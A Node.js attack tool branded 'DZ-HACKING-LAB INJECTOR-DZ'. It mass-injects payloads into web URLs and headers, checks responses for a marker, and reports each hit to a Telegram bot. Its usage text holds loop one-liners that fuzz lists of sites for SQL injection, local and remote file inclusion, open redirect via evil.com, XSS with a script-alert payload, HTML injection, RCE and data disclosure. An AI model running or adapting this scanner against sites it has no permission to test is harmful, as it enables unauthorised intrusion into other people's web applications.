const request = require('request');

const args = process.argv.slice(2);
const URL = args[0];
const PAYLOAD = args[1];
const ME = args[2];
const INJECTION = args[3];
const BUG = args[4];
const token = args[5];
const channel = args[6];
const messageme = args[7];



// LETS HACK
Main()
if(URL === undefined || PAYLOAD === undefined || ME === undefined || INJECTION === undefined || BUG === undefined || token === undefined || channel === undefined || messageme === undefined) {
    const str = `
	DZROOT BUG
	SCAN
	FIND
	EXPLOIT
 			DZ-HACKING-LAB @EL-MO9AWIN\n 
					`;



    console.log(str);

    console.log('\n\n','\x1b[31m',
     `
    ⠀⠀⢀⣀⣀⣀⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣀⣀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⣾⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⠀⠀⠀⠀⢀⠀⠈⡇⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⣿⠀⠁⠀⠘⠁⠀⠀⠀⠀⠀⣀⡀⠀⠀⠀⠈⠀⠀⡇⠀⠀⠀⠀
⣀⣀⣀⠀⠀⠀⣿⠀⠀⠀⠀⠀⠄⠀⠀⠸⢰⡏⠉⠳⣄⠰⠀⠀⢰⣷⠶⠛⣧⠀
⢻⡀⠈⠙⠲⡄⣿⠀⠀⠀⠀⠀⠀⠀⠠⠀⢸⠀⠀⠀⠈⠓⠒⠒⠛⠁⠀⠀⣿⠀
⠀⠻⣄⠀⠀⠙⣿⠀⠀⠀⠈⠁⠀⢠⠄⣰⠟⠀⢀⡔⢠⠀⠀⠀⠀⣠⠠⡄⠘⢧
⠀⠀⠈⠛⢦⣀⣿⠀⠀⢠⡆⠀⠀⠈⠀⣯⠀⠀⠈⠛⠛⠀⠠⢦⠄⠙⠛⠃⠀⢸
⠀⠀⠀⠀⠀⠉⣿⠀⠀⠀⢠⠀⠀⢠⠀⠹⣆⠀⠀⠀⠢⢤⠠⠞⠤⡠⠄⠀⢀⡾
⠀⠀⠀⠀⠀⢀⡿⠦⢤⣤⣤⣤⣤⣤⣤⣤⡼⣷⠶⠤⢤⣤⣤⡤⢤⡤⠶⠖⠋⠀
⠀⠀⠀⠀⠀⠸⣤⡴⠋⠸⣇⣠⠼⠁⠀⠀⠀⠹⣄⣠⠞⠀⢾⡀⣠⠃⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠁⠀⠀⠀⠀
    `,'\x1b[0m');


    console.log('DZ-HACKING-LAB @EL-MO9AWIN\n');


    console.log('\n\n','\x1b[31m','DZROOT CYBER-ROOM </>\nDZROOT INJECTOR-DZ\nFOR MASS INJECTION FORMS AND HEADERS \n\n','\x1b[0m');
    console.log("\nUSAGE : node reqx.js URL PAYLOAD HEADER-ME INJECTION BUG-ME CHANNEL-TOKEN CHANNEL-ID MSG-ME");
    console.log("EXP: node INJECTOR-DZ.js http://0.0.0.0:8080/post.php?post= poc User-Agent DZROOT poc TOKEN ID\n");
    console.log("EXP: for x in $(cat FUZZ.txt);do node INJECTOR-DZ.js http://domain.com/post= $x User-Agent DZROOT SQL TOKEN ID SQL-FOUND;done");
    console.log("EXP: for x in $(cat FUZZ.txt);do node INJECTOR-DZ.js http://domain.com/post= $x User-Agent DZROOT root:* TOKEN ID LFI-FOUND;done");
    console.log("EXP: for x in $(cat FUZZ.txt);do node INJECTOR-DZ.js http://domain.com/post= $x User-Agent DZROOT evil.com TOKEN ID RFI-FOUND;done");
    console.log("EXP: for x in $(cat FUZZ.txt);do node INJECTOR-DZ.js http://domain.com/post= $x User-Agent DZROOT evil.com TOKEN ID OPENRED-FOUND;done");
    console.log("EXP: for x in $(cat FUZZ.txt);do node INJECTOR-DZ.js http://domain.com/post= $x User-Agent DZROOT <script>alert(1)</script> TOKEN ID XSS-FOUND;done");
    console.log("EXP: for x in $(cat FUZZ.txt);do node INJECTOR-DZ.js http://domain.com/post= $x User-Agent DZROOT <h1>poc</h1> TOKEN ID HTMLI-FOUND;done");    
    console.log("EXP: for x in $(cat FUZZ.txt);do node INJECTOR-DZ.js http://domain.com/post= $x User-Agent DZROOT root TOKEN ID RCE-FOUND;done");



    console.log("EXP: for x in $(cat FUZZ.txt);do for z in $(cat site.txt);do node INJECTOR-DZ.js $z $x User-Agent DZROOT Api: TOKEN ID DISCLURE-FOUND;done;done");


    console.log("\n\n WE SCAN FOR BUG WHEN WE LOOK FOR YOU /n LOOKING FOR HUNTING LIKE A DREAM WAKE UP WE POCING NOW");

    process.exit(1);
}
var ALL = URL+PAYLOAD;
var INJECTOR = ME+":"+ INJECTION;

async function Main(){

	const options = {
  		url: ALL,
  		headers: {
			"DZROOT-INJECTOR": INJECTOR
		}
	};
	function callback(error, response, body) {
  	if (!error && response.statusCode == 200) {
    		const info = body;
		console.log("\n\n",response);
    		console.log("\n\n",info);
		if(body.indexOf(BUG) !== -1){


			const notifier = require('node-notifier');

			var MSG = messageme;
    // String
		        var alert = " BUG FOUND ON :" + URL+PAYLOAD + " \n" + MSG;
    // Object
         		notifier.notify({
                		title: 'BUG FIND',
                		message: alert,
         		});



			console.log('\n\n','\x1b[31m',
	      `		    
	     ⢠⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣾⡟⠋⣍⣩⣽⣿⣿⣿⣿⣿⡍⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⡟⠀⣘⠙⣿⣿⣿⡿⠟⢻⣿⠀⠀⠀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⠛⠿⠅⠙⣿⠋⠀⠀⢸⡿⠿⠛⠋⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⣇⡀⠀⠀⠀⣿⡆⠀⠀⠘⣿⣦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣫⠃⠄⢀⣤⠁⠀⠀⣴⡿⠋⣹⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⠻⣷⣾⣿⢀⣴⠟⠋⠀⠀⠉⠙⢷⣤⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀NEVER GIVE UP⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⣿⡾⠋⠀⠀⠀⢀⣀⣀⡀⠘⣷⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡾⣱⡟⠁⠀⠀⠀⠀⠀⠀⠉⢿⡄⠈⣧⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣴⡟⢱⡏⢀⣠⠤⣄⠀⠀⠀⠀⠀⠈⠻⣄⠈⣇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀DREAM 
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣾⡟⣠⠋⠀⢸⣇⣀⡟⢀⡄⠀⠀⠀⠀⠀⠈⠣⢿⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼⡿⡜⠁⠀⠀⠈⠉⠉⠀⢸⠃⠀⠀⠀⠀⠀⠀⠀⠈⣧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀CODE
⢀⣤⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⣿⡟⠁⠀⠀⠀⠀⠀⠀⢠⡞⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠛⠿⣿⣷⣦⣤⣀⠀⠀⠀⢸⣿⠁⠀⠀⠀⠀⠀⠀⠀⣾⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀	  HACK⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠈⡙⠻⢿⣿⣶⣦⣼⡏⠀⠀⠀⠀⠀⠀⠀⢀⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣷⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠰⣿⣷⣶⣤⣝⣛⣿⣿⣿⣦⣄⣠⡄⠀⠀⣾⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠉⠉⠛⠿⢿⣿⣶⣯⣿⣿⣿⣿⣦⣤⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⡟⢉⣛⣻⣿⣿⣿⣿⣿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠻⢦⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⡆⠈⠉⠀⠀⠈⠉⠉⡝⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣹⠷⠒⠛⠓⠓⠒⠲⠦⢳⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣼⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡶⠶⣦⣤⣀⠀⠀⠀⣾⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣾⣿⣿⣿⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣇⠀⠀⠀⠈⠉⠛⠶⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⣿⣿⣿⣯⣁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⡟⠀⡄⠀⠀⠀⠀⠰⣇⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣾⠟⠁⠀⠙⠻⢿⣿⣦⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⡿⠁⠀⢧⠀⠀⠀⠀⠀⠹⣷⣄⠀⠀⠀⠀⠀⣠⣾⣿⠁⠀⠀⠀⠀⠀⠀⠉⠻⢿⣿⣦⣀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⠇⠀⡆⠸⡆⠀⠀⠀⠀⠀⠙⢿⣧⡀⠀⠀⢰⣿⣿⣿⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠻⢿⣷⣤⣀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⠀⠀⣧⠀⢹⠀⠀⠀⠀⠀⠀⠈⢿⣿⣦⣤⣾⣿⣿⡿⣧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠛⢿⣶⣄⡀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⡇⠀⢹⠀⠈⣇⠀⠀⠀⠀⠀⠀⠀⠉⠻⢿⣿⣿⣿⠀⢻⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠻⣿⡆
⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⡇⠀⠸⡆⠀⢻⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠛⠋⠀⠘⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠁
⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⡇⠀⠀⣇⠀⠀⣷⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⠀⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⢹⡇⠀⠀⢻⡄⠀⢸⣇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢿⣞⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣧⠀⠀⢸⣇⠀⠈⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⡀⠀⠀⢿⠀⠀⢸⡇⠀⠀⠀⢰⡀⠀⠀⠀⠀⠀⠀⠘⣿⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⡇⠀⠀⢸⣧⠀⠸⣿⠀⠀⠀⠀⢷⠀⠀⠀⠀⠀⠀⠀⠈⢿⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢹⡇⠀⠀⠀⣿⡀⠀⣿⡄⠀⠀⠀⠀⣇⠀⠀⠀⠀⠀⠀⠀⠈⢿⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣧⠀⠀⠀⢹⣇⠀⢹⣇⠀⠀⠀⠀⠸⡆⠀⠀⠀⠀⠀⠀⠀⠈⢿⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣿⠀⠀⠀⠀⣿⡄⠀⢿⠀⠀⠀⠀⠀⢳⠀⠀⠀⠀⠀⠀⠀⠀⠈⢿⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢿⡆⠀⠀⠀⢹⣇⠀⢸⡇⠀⠀⠀⠀⠘⣧⠀⠀⠀⠀⠀⠀⠀⠀⠘⣿⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣧⠀⠀⠀⠘⣿⠀⠀⣇⠀⠀⠀⠀⠀⠹⣆⠀⠀⠀⠀⠀⠀⠀⠀⢹⣷⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⠀⠀⠀⠀⢻⡇⠀⠘⡆⠀⠀⠀⠀⠀⢿⣆⠀⠀⠀⠀⠀⢀⣠⣾⠟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣿⠀⠀⠀⠀⢸⣿⠀⠀⢧⠀⠀⠀⠀⠀⠘⣿⡄⠀⠀⣀⣴⡿⠟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣿⣀⣀⣠⣤⣼⣿⡀⠀⠀⠀⠀⠀⠀⢀⣠⣾⡟⣉⣉⣩⣿⠆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠉⠉⢁⣠⠴⣿⠛⠛⠛⠛⣿⡛⠛⢻⠟⢻⠉⠀⠀⢀⣸⣦⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⡤⢶⡯⢥⣀⣹⣄⣠⠤⢞⣩⠷⣶⣉⣀⣨⣷⠶⠚⠉⠁⣹⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠿⣧⣤⡤⢽⣧⣤⠤⢿⢤⣴⣿⣤⣤⣤⣿⣤⣤⣼⡦⠤⠴⡶⣿⡇⠀⠀⠀⠀⠀⠀⠀
   			 `,'\x1b[0m');


                	console.log('\n\n\x1b[31m',"FOUND BUG || PAYLOAD >>",'\x1b[0m',PAYLOAD);
			console.log("\n\nFOUND BUG >>> ",URL+" |PAYLOAD| "+PAYLOAD)
		        const https = require('https')
        		const querystring = require('querystring')
        		const FOUND = URL+PAYLOAD;
        		const message = "[#] DZPOC FOUND BUG >>> URL+PAYLOAD [1337] |> "+FOUND+ "\n"+messageme;
			const cheerio = require('cheerio');
			const axios = require('axios');
			var url = FOUND;
			async function me (x) {
			await axios.get(x)
			.then((res) => {

			//cheerio 
			//https://axios-http.com/docs/res_schema

			//body
			var body = res.data;
			var statusCode = res.status;
			var statusText =  res.statusText;
			var headers = res.headers;
			var request = res.request;
			var config = res.config;

			//jquery
			let $ = cheerio.load(body);

			//variables
			console.log(body);
			console.log(statusCode);
			console.log(statusText);
			console.log(headers);
			console.log(config);
			console.log(request);

			}).catch(async function (e) {
			await console.log(e);
			});
			};

			me(url);

        		module.exports = {
          			sendMessage,
          			sendMessageFor,
          			sendRequest
        		}

        		function sendMessage (token, channel, message) {
          			return sendMessageFor(token, channel)(message)
        		}

        		function sendMessageFor (token, channel) {
          			const baseUrl = `https://api.telegram.org/bot${token}`

          		return message => {
            			const urlParams = querystring.stringify({
              			chat_id: channel,
              			text: message,
              			parse_mode: 'HTML'
            			})

            		return sendRequest(`${baseUrl}/sendMessage?${urlParams}`)
          			}
        		}

        		function sendRequest (url) {
          			return new Promise((resolve, reject) => {
            			https.get(url, res => res.statusCode === 200 ? resolve(res) : reject(res))
              			.on('error', reject)
          			})
        		}
        		sendMessage (token, channel, message)
                }
                else {
                	console.log("\n\nNO BUG << PAYLOAD || ",PAYLOAD);
                	}
  		}
	};
	request(options, callback);
}
Main()
